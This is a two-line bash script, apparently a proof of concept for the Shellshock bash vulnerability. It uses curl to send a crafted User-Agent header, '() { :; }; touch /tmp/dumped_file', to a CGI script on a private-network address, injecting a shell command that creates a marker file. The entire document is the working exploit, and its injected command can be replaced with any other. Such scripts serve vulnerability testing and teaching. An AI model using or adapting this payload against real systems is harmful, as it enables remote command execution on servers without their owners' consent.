#!/bin/bash1
curl -A '() { :; }; touch  /tmp/dumped_file' "http://192.168.1.102/cgi-bin/shell/shellshock_remote.sh"
